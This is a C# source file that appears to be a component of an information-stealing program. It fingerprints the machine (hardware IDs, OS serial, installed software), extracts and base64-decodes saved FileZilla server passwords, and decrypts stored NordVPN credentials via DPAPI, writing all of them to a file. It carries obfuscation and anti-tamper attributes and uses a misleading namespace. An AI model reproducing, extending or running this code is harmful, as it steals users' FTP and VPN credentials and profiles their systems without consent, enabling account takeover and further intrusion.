using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Xml.Linq;
using System.Reflection;
using System.IO;
using System.Xml;
using System.Text.RegularExpressions;
using System.Drawing.Imaging;
using System.Drawing;
using System.Management;
using Microsoft.Win32;

namespace DebuggerStepThroughAttribute
{
    public static class V
    {
        public static string OXOX = "";
        [Obfuscation(Exclude = false, Feature = "+koi;-ctrl flow;+anti tamper")]
        public static void GETPPL()
        {
            List<string> list = new List<string>();
            try
            {
                string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall";
                using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name))
                {
                    foreach (string name2 in registryKey.GetSubKeyNames())
                    {
                        using (RegistryKey registryKey2 = registryKey.OpenSubKey(name2))
                        {
                            try
                            {
                                string text = registryKey2.GetValue("DisplayName").ToString();
                                string str = registryKey2.GetValue("DisplayVersion").ToString();
                                if (!string.IsNullOrWhiteSpace(text))
                                {
                                    list.Add(text + " " + str + "\r\n");
                                }
                            }
                            catch
                            {
                            }
                        }
                    }
                }
            }
            catch
            {
            }
            if (list != null && list.Count > 0)
            {
                foreach (string str2 in list)
                {
                    OXOX += str2;
                }
            }
            
        }

        [Obfuscation(Exclude = false, Feature = "+koi;-ctrl flow;+anti tamper")]
        public static string GETHOOC()
        {
            string text = "Failed to grab.";
            try
            {
                foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("select * from Win32_DiskDrive").Get())
                {
                    ManagementObject managementObject = (ManagementObject)managementBaseObject;
                    foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("associators of {" + managementObject.Path.RelativePath + "} where AssocClass = Win32_DiskDriveToDiskPartition").Get())
                    {
                        try
                        {
                            ManagementObject managementObject2 = (ManagementObject)managementBaseObject2;
                            foreach (ManagementBaseObject managementBaseObject3 in new ManagementObjectSearcher("associators of {" + managementObject2.Path.RelativePath + "} where AssocClass = Win32_LogicalDiskToPartition").Get())
                            {
                                try
                                {
                                    ManagementObject managementObject3 = (ManagementObject)managementBaseObject3;
                                    string text2 = managementObject3.Properties["Name"].Value.ToString();
                                    string signature = managementObject.Properties["Signature"].Value.ToString();
                                    string text3 = managementObject3.Properties["VolumeSerialNumber"].Value.ToString();
                                    if (text == "Failed to grab." && text2 == new DirectoryInfo(Environment.GetEnvironmentVariable("windir")).Root.Name.Replace("\\", ""))
                                    {
                                        text = text3;
                                    }
                                }
                                catch { }
                            }
                        }
                        catch
                        {
                        }
                    }
                }
            }
            catch
            {
            }
            string uid = "Failed to grab.";
            string text4 = "Failed to grab.";
            string text22 = "Failed to grab.";
            try
            {
                ManagementObject managementObject = new ManagementObject("Win32_OperatingSystem=@");
                uid = managementObject["SerialNumber"].ToString();
                text4 = managementObject["Caption"].ToString();
                text22 = managementObject["OSArchitecture"].ToString();
                if (text4.Contains("8"))
                {
                    text4 = "Windows 8";
                }
                if (text4.Contains("8.1"))
                {
                    text4 = "Windows 8.1";
                }
                if (text4.Contains("10"))
                {
                    text4 = "Windows 10";
                }
                if (text4.Contains("XP"))
                {
                    text4 = "Windows XP";
                }
                if (text4.Contains("7"))
                {
                    text4 = "Windows 7";
                }
                if (text4.Contains("Server"))
                {
                    text4 = "Windows Server";
                }
                if (text22.Contains("64"))
                {
                    text22 = "x64";
                }
                if (text22.Contains("32"))
                {
                    text22 = "x32";
                }
                if (text22.Contains("86"))
                {
                    text22 = "x32";
                }
            }
            catch
            {
            }
            string e = "Failed to grab.";
            try
            {
                e = new ManagementObjectSearcher("select * from Win32_Processor").Get().Cast<ManagementObject>().First<ManagementObject>()["Name"].ToString();
            }
            catch
            {
            }

            string ram = "";
            try
            {
                foreach (ManagementBaseObject managementBaseObject in new ManagementClass("Win32_ComputerSystem").GetInstances())
                {
                    ram = Convert.ToString(DOMATHS(Convert.ToInt64(((ManagementObject)managementBaseObject).Properties["TotalPhysicalMemory"].Value)));
                }
            }
            catch
            {
            }


            return "\nHWID: " + text + "\nCPU: " + e + "\nRAM: " + ram + "\nOS: " + text4 + " " + text22 + "\nUUID: " + uid;

        }

        private static string DOMATHS(long A_0)
        {
            string result;
            try
            {
                if (A_0 > 1073741824L)
                {
                    result = Math.Ceiling(A_0 / 1073741824m).ToString("#,### GB");
                }
                else if (A_0 > 1048576L)
                {
                    result = Math.Ceiling(A_0 / 1048576m).ToString("#,### MB");
                }
                else if (A_0 < 1L)
                {
                    result = ((A_0 < 0L) ? "" : A_0.ToString("#,### B"));
                }
                else
                {
                    result = Math.Ceiling(A_0 / 1024m).ToString("#,### KB");
                }
            }
            catch
            {
                result = A_0.ToString();
            }
            return result;
        }

        [Obfuscation(Exclude = false, Feature = "+koi;-ctrl flow;+anti tamper")]
        public static void GETF(string p)
        {
            try
            {
                string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string path = folderPath + "\\FileZilla\\";
                if (Directory.Exists(path))
                {
                    foreach (FileInfo fileInfo in new DirectoryInfo(path).GetFiles())
                    {
                        if (fileInfo.Name.Contains("recentservers.xml"))
                        {
                            string input = File.ReadAllText(fileInfo.FullName);
                            MatchCollection matchCollection = new Regex("<Pass encoding=\"base64\">(.*?)</Pass>").Matches(input);
                            MatchCollection PortMC = new Regex("<Port>(.*?)</Port>").Matches(input);
                            MatchCollection HostMC = new Regex("<Host>(.*?)</Host>").Matches(input);
                            MatchCollection UserMC = new Regex("<User>(.*?)</User>").Matches(input);
                            int num = matchCollection.Count - 1;
                            for (int i = 0; i <= num; i += 1)
                            {
                                try
                                {         
                                    string decPass = Encoding.UTF8.GetString(Convert.FromBase64String(matchCollection[i].Groups[1].Value));
                                    input = Regex.Replace(input, matchCollection[i].Groups[1].Value, decPass);
                                    string user = UserMC[i].Groups[1].Value;
                                    string port = PortMC[i].Groups[1].Value;
                                    string host = HostMC[i].Groups[1].Value;
                                    File.AppendAllText(p, $"FileZilla | Host: {HostMC[i].Groups[1].Value} | User: {UserMC[i].Groups[1].Value} | Pass: {decPass} | Port: {PortMC[i].Groups[1].Value}\n");
                                }
                                catch { }
                            }
                        }
                    }
                }
            }
            catch { }
        }
        [Obfuscation(Exclude = false, Feature = "+koi;-ctrl flow;+anti tamper")]
        public static void GETN(string p)
        {
            try
            {
                string user = null;
                string pass = null;

                string configPath = GetConfigPath();
                if (String.IsNullOrEmpty(configPath))
                {
                    return;
                }
                XDocument xdocument = XDocument.Load(configPath);
                foreach (XElement xelement in xdocument.Descendants("setting"))
                {
                    if (xelement.FirstAttribute.Value == "Username")
                    {
                        user = xelement.Value;
                    }
                    else if (xelement.FirstAttribute.Value == "Password")
                    {
                        pass = xelement.Value;
                    }
                }

                if (!(String.IsNullOrEmpty(user)) && !(String.IsNullOrEmpty(pass)))
                {
                    File.AppendAllText(p, "NordVPN | " + NDecrypt(user) + " | " + NDecrypt(pass) + "\n");
                }
            }
            catch { }
        }
        [Obfuscation(Exclude = false, Feature = "+koi;-ctrl flow;+anti tamper")]
        private static string GetConfigPath()
        {
            List<string> list = (from f in Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "NordVPN"))
                                 where f.Contains("NordVPN.exe_")
                                 select f).ToList<string>();
            string path = Assembly.GetEntryAssembly().GetName().Version.ToString();
            foreach (string path2 in list)
            {

                foreach (DirectoryInfo directoryInfo4 in new DirectoryInfo(path2).GetDirectories())
                {
                    foreach (FileInfo fileInfo2 in directoryInfo4.GetFiles())
                    {
                        if (fileInfo2.FullName.Contains("user.config"))
                            return fileInfo2.FullName;
                    }
                }
            };
            return "";
        }
        public static string NDecrypt(this string data)
        {
            byte[] bytes = Convert.FromBase64String(data).NDecrypt();
            return Encoding.UTF8.GetString(bytes);
        }
        public static byte[] NDecrypt(this byte[] data)
        {
            return ProtectedData.Unprotect(data, null, DataProtectionScope.LocalMachine);
        }
    }
}
